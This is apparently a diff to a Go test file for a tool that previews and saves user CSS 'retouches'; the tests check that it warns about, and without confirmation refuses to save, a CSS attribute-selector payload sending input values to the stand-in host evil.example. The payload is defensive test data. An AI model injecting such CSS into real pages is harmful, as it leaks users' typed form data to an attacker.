@@ -149,6 +149,12 @@ func TestRetouches(t *testing.T) {
 	prev = rh.ok(t, "retouch_preview", map[string]any{"css": `input[value^="a"] { background: url(https://evil.example/a) }`})
 	mustContain(t, prev, "warnings:", "evil.example")
 	rh.fail(t, "retouch_save", map[string]any{"name": "vaza"}, "retouch not saved")
+	// Com a confirmação da pessoa (ignoreWarnings=true), salva.
+	mustContain(t, rh.ok(t, "retouch_save", map[string]any{"name": "vaza", "ignoreWarnings": true}), `retouch "vaza" saved`)
+	if _, err := os.Stat(filepath.Join(dir, "vaza", "style.css")); err != nil {
+		t.Fatalf("save with ignoreWarnings: %v", err)
+	}
+	rh.ok(t, "retouch_preview", map[string]any{"css": `input[value^="a"] { background: url(https://evil.example/a) }`})
 	mustContain(t, rh.ok(t, "retouch_discard", nil), "removed")
 	mustContain(t, rh.ok(t, "retouch_discard", nil), "no retouch preview")
 	rh.fail(t, "retouch_save", map[string]any{"name": "vaza"}, "no retouch preview")
